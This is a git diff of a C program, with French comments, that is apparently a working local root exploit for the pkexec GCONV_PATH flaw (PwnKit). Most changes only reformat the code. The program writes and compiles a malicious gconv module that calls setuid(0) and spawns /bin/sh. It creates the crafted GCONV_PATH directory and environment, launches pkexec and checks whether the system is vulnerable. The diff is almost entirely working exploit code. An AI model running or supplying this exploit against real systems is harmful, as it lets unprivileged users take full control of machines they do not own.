@@ -11,28 +11,30 @@ struct stat st;
 int pipefd[2];
 
 char buf[99999];
-void compileExploit() {
+void compileExploit()
+{
   // Créer le fichier exploit/exploit.c et y écrire le programme en C qui tente
   // de prendre les privilèges du superutilisateur (root) en appelant setuid() et setgid().
-  FILE * fp;
+  FILE *fp;
   fp = fopen("exploit/exploit.c", "w");
-  if (fp < 0) {
+  if (fp < 0)
+  {
     perror("fopen");
     exit(0);
   }
 
-  char * shell =
-  "#include <stdio.h>\n"
-  "#include <stdlib.h>\n"
-  "#include <unistd.h>\n"
-  "void gconv() {}\n"
-  "void gconv_init() {\n"
-  "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
-  "  static char *a_argv[] = { \"sh\", NULL };\n"
-  "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
-  "  execve(\"/bin/sh\", a_argv, a_envp);\n"
-  "  exit(0);\n"
-  "}\n";
+  char *shell =
+      "#include <stdio.h>\n"
+      "#include <stdlib.h>\n"
+      "#include <unistd.h>\n"
+      "void gconv() {}\n"
+      "void gconv_init() {\n"
+      "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
+      "  static char *a_argv[] = { \"sh\", NULL };\n"
+      "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
+      "  execve(\"/bin/sh\", a_argv, a_envp);\n"
+      "  exit(0);\n"
+      "}\n";
 
   fprintf(fp, "%s", shell);
   fclose(fp);
@@ -42,18 +44,22 @@ void compileExploit() {
   system("gcc exploit/exploit.c -o exploit/exploit.so -shared -fPIC");
 }
 
-void gconvpath() {
+void gconvpath()
+{
   // Vérifier si le répertoire GCONV_PATH=. existe.
-  if (stat("GCONV_PATH=.", & st) < 0) {
+  if (stat("GCONV_PATH=.", &st) < 0)
+  {
     // Si le répertoire n'existe pas, le créer avec les permissions 0777
     // (lecture, écriture et exécution pour tous les utilisateurs).
-    if (mkdir("GCONV_PATH=.", 0777) < 0) {
+    if (mkdir("GCONV_PATH=.", 0777) < 0)
+    {
       perror("mkdir");
       exit(0);
     }
     // Créer le fichier exploit dans GCONV_PATH=.
     int fd = open("GCONV_PATH=./exploit", O_CREAT | O_RDWR, 0777);
-    if (fd < 0) {
+    if (fd < 0)
+    {
       perror("open");
       exit(0);
     }
@@ -61,12 +67,15 @@ void gconvpath() {
   }
 }
 
-void iconv_open() {
+void iconv_open()
+{
   // Vérifier si le répertoire exploit existe.
-  if (stat("exploit", & st) < 0) {
+  if (stat("exploit", &st) < 0)
+  {
     // Si le répertoire n'existe pas, le créer avec les permissions 0777
     // (lecture, écriture et exécution pour tous les utilisateurs)
-    if (mkdir("exploit", 0777) < 0) {
+    if (mkdir("exploit", 0777) < 0)
+    {
       perror("mkdir");
       exit(0);
     }
@@ -76,8 +85,9 @@ void iconv_open() {
     // exploit.so est un module de conversion de caractères appelé exploit
     // compatible avec le jeu de caractères UTF-8 et NOT_UTF8.
 
-    FILE * fp = fopen("exploit/gconv-modules", "wb");
-    if (fp == NULL) {
+    FILE *fp = fopen("exploit/gconv-modules", "wb");
+    if (fp == NULL)
+    {
       perror("fopen");
       exit(0);
     }
@@ -86,52 +96,59 @@ void iconv_open() {
   }
 }
 
-void checkVulnerability() {
-    // Le processus principal (appelé le processus père) crée un nouveau processus enfant 
-    pid_t pid = fork();
-     
-    if ( pid == 0 ) {
-        execve("/usr/bin/pkexec", (char*[]){NULL}, NULL);
+void checkVulnerability()
+{
+  // Le processus principal (appelé le processus père) crée un nouveau processus enfant
+  pid_t pid = fork();
+
+  if (pid == 0)
+  {
+    int fd = open("/dev/null", O_WRONLY);
+    dup2(fd, 1);
+    dup2(fd, 2);
+    execve("/usr/bin/pkexec", (char *[]){NULL}, NULL);
+  }
+
+  else
+  {
+    int status;
+    waitpid(pid, &status, 0);
+
+    //  Lorsque le processus enfant s'est terminé, la fonction WIFEXITED() est utilisée pour vérifier si l'exécution s'est terminée
+    // normalement, et la fonction WEXITSTATUS() est utilisée pour obtenir le code de sortie du processus enfant.
+    if (WIFEXITED(status))
+    {
+      int exit_status = WEXITSTATUS(status);
+
+      // Si le code de sortie est égal à 1, cela signifie que le système n'est pas vulnérable,
+      if (exit_status == 1)
+      {
+        puts("Your system is not vulnerable");
+        exit(0);
+      }
+
+      // Sinon, cela signifie que le système est vulnérable,
+      else
+      {
+        puts("Your system is vulnerable\n");
+      }
     }
- 
-    else {
-        int status;
-        waitpid(pid, &status, 0);
-
-        //  Lorsque le processus enfant s'est terminé, la fonction WIFEXITED() est utilisée pour vérifier si l'exécution s'est terminée
-        // normalement, et la fonction WEXITSTATUS() est utilisée pour obtenir le code de sortie du processus enfant. 
-        if ( WIFEXITED(status) )
-        {
-            int exit_status = WEXITSTATUS(status);
-
-            // Si le code de sortie est égal à 1, cela signifie que le système n'est pas vulnérable, 
-            if (exit_status == 1) {
-            	puts("Your system is not vulnerable");
-              exit(0);
-            }
-
-            // Sinon, cela signifie que le système est vulnérable, 
-            else {
-            	puts("Your system is vulnerable\n");
-            }
-        }
-    }
+  }
 }
 
-int main(int argc, char * argv[]) {
+int main(int argc, char *argv[])
+{
   // Créer un pointeur de fichier pour écrire dans le fichier exploit.c
-  FILE * fp;
+  FILE *fp;
 
-  char * a_argv[] = {
-    NULL
-  };
-  char * a_envp[] = {
-    "exploit",
-    "PATH=GCONV_PATH=.",
-    "CHARSET=NOT_UTF8",
-    "SHELL=not/in/etc/shells",
-    NULL
-  };
+  char *a_argv[] = {
+      NULL};
+  char *a_envp[] = {
+      "exploit",
+      "PATH=GCONV_PATH=.",
+      "CHARSET=NOT_UTF8",
+      "SHELL=not/in/etc/shells",
+      NULL};
 
   gconvpath();
 
